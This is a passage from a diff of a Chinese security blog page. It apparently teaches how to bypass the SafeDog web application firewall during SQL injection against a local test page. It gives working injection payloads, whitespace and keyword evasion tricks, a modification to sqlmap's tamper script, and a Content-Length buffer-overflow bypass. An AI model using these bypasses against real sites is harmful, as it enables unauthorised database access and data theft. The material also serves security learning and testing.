+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1&apos; and /*!12345updatexml!*/(1,concat(0x7e,version()))%23</span><br><span class="line">http://127.0.0.1/test.php?id=1&apos; and /*!12345extractvalue!*/(1,concat(0x7e,version()))%23</span><br></pre></td></tr></table></figure>
+<h3 id="绕过select-from"><a href="#绕过select-from" class="headerlink" title="绕过select from"></a>绕过select from</h3><p>使用大括号去绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4From&#123;information_schema.tables&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ae01.alicdn.com/kf/HTB1t6WTe75E3KVjSZFCq6zuzXXaI.jpg" alt=""></p>
+<p>使用反引号去绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4 From`information_schema.tables`</span><br></pre></td></tr></table></figure>
+<p>使用\N去绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,\Nfrom information_schema.tables</span><br></pre></td></tr></table></figure>
+<p>括号法去绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,From(((information_schema.tables)))</span><br></pre></td></tr></table></figure>
+<p>也可以组合起来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4\Nfrom&#123;a`information_schema`.tables&#125;</span><br></pre></td></tr></table></figure>
+<p>这些都是去掉空格的合法语句,当然如果不拦截/*<em>/或/</em>!*/的话,也可以尝试这两个</p>
+<p>提示，安全狗默认不开启对information_schema的拦截，如果开启了，那么就得找支持post传递数据的注入点了，post下不拦截information_schema这个关键词。</p>
+<p>补充点</p>
+<p>php+mysql环境下支持的空格有：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0a,%0b,%0c,%0d,%20,%09,%a0,/**/</span><br></pre></td></tr></table></figure>
+<p>其中使用的最多的就是%0a,%0b,%a0,/**/，这四个当作空格插入在语句中来扰乱waf检测。</p>
+<p>干货分享：使用/<em>^!$asd%2a–=</em>/代替空格即可，找到sqlmap中tamper目录下的space2plus.py文件，将其中代替空格的/*<em>/换成/</em>^!$asd%2a–=*/即可使用sqlmap跑了。</p>
+<h3 id="缓冲区溢出绕waf"><a href="#缓冲区溢出绕waf" class="headerlink" title="缓冲区溢出绕waf"></a>缓冲区溢出绕waf</h3><p>另外也可以对安全狗实行缓冲区溢出绕waf</p>
+<p>缓冲区溢出用于对WAF，有不少WAF是C写的，而C语言本身没有缓冲区保护机制，因此如果WAF在处理测试量时超出其缓冲区长度，就会引发bug从而实现绕过</p>
+<p>要求是(针对于安全狗而已):</p>
+<p>​    GET类型请求转换成POST类型</p>
+<p>​    Content-Length头长度大于4008</p>
+<p>​    正常参数放置在脏数据后面</p>
+<p><img src="https://ae01.alicdn.com/kf/HTB1P4GVe8WD3KVjSZKPq6yp7FXa6.jpg" alt=""></p>
 
       
     </div>
@@ -533,7 +610,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/漏洞复现/" rel="tag"><i class="fa fa-tag"></i> 漏洞复现</a>
+            <a href="/tags/绕安全狗/" rel="tag"><i class="fa fa-tag"></i> 绕安全狗</a>
           
         </div>
       
@@ -546,8 +623,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/03/05/wordpress插件漏洞/" rel="next" title="WordPress插件注入漏洞">
-                <i class="fa fa-chevron-left"></i> WordPress插件注入漏洞
+              <a href="/2019/07/03/elasticsearch命令执行漏洞/" rel="next" title="ElasticSearch命令执行漏洞复现">
+                <i class="fa fa-chevron-left"></i> ElasticSearch命令执行漏洞复现
               </a>
             
           </div>
@@ -555,10 +632,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/05/14/docker基础(一)/" rel="prev" title="docker学习笔记(一)">
-                docker学习笔记(一) <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -816,7 +889,7 @@ show_date_time();
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ThinkPHP5-5-0-22-5-1-29-远程代码执行漏洞"><span class="nav-number">1.</span> <span class="nav-text">ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞描述"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞等级"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞等级</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞危害"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞危害</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞检测方法"><span class="nav-number">1.4.</span> <span class="nav-text">漏洞检测方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用方法"><span class="nav-number">1.5.</span> <span class="nav-text">漏洞利用方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞修复方案"><span class="nav-number">1.6.</span> <span class="nav-text">漏洞修复方案:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ThinkPHP5-5-0-23-远程代码执行漏洞"><span class="nav-number">2.</span> <span class="nav-text">ThinkPHP5 5.0.23 远程代码执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞描述-1"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞等级-1"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞等级</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞危害-1"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞危害</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞检测方法-1"><span class="nav-number">2.4.</span> <span class="nav-text">漏洞检测方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用方法-1"><span class="nav-number">2.5.</span> <span class="nav-text">漏洞利用方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞修复方案-1"><span class="nav-number">2.6.</span> <span class="nav-text">漏洞修复方案:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ThinkPHP5版本-SQL注入漏洞和敏感信息泄露漏洞"><span class="nav-number">3.</span> <span class="nav-text">ThinkPHP5版本 SQL注入漏洞和敏感信息泄露漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞描述-2"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞等级-2"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞等级</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞危害-2"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞危害</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞检测方法-2"><span class="nav-number">3.4.</span> <span class="nav-text">漏洞检测方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用方法-2"><span class="nav-number">3.5.</span> <span class="nav-text">漏洞利用方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞修复方案-2"><span class="nav-number">3.6.</span> <span class="nav-text">漏洞修复方案:</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击的特定"><span class="nav-number">1.</span> <span class="nav-text">攻击的特定:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#目前市面主流的WAF产品"><span class="nav-number">2.</span> <span class="nav-text">目前市面主流的WAF产品:</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#云WAF"><span class="nav-number">2.1.</span> <span class="nav-text">云WAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#软件产品类"><span class="nav-number">2.2.</span> <span class="nav-text">软件产品类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#硬件类型设备"><span class="nav-number">2.3.</span> <span class="nav-text">硬件类型设备:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WAF的核心原理"><span class="nav-number">3.</span> <span class="nav-text">WAF的核心原理:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WAF的几种部署模式"><span class="nav-number">4.</span> <span class="nav-text">WAF的几种部署模式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于DNS解析"><span class="nav-number">4.1.</span> <span class="nav-text">基于DNS解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#串联模式"><span class="nav-number">4.2.</span> <span class="nav-text">串联模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#"><span class="nav-number">4.3.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#旁路模式"><span class="nav-number">4.4.</span> <span class="nav-text">旁路模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#软件嵌入中间件-检测引擎模式"><span class="nav-number">4.5.</span> <span class="nav-text">软件嵌入中间件+检测引擎模式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WAF为什么会被绕过"><span class="nav-number">5.</span> <span class="nav-text">WAF为什么会被绕过:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WAF绕过实战—-绕过安全狗进行注入"><span class="nav-number">6.</span> <span class="nav-text">WAF绕过实战—-绕过安全狗进行注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#实验环境"><span class="nav-number">6.1.</span> <span class="nav-text">实验环境:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过拦截and-1-1"><span class="nav-number">6.2.</span> <span class="nav-text">绕过拦截and 1=1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过order-by查询"><span class="nav-number">6.3.</span> <span class="nav-text">绕过order by查询</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过union-select查询"><span class="nav-number">6.4.</span> <span class="nav-text">绕过union select查询</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过select-from"><span class="nav-number">6.5.</span> <span class="nav-text">绕过select from</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#缓冲区溢出绕waf"><span class="nav-number">6.6.</span> <span class="nav-text">缓冲区溢出绕waf</span></a></li></ol></li></ol></div>
             
 
           </div>
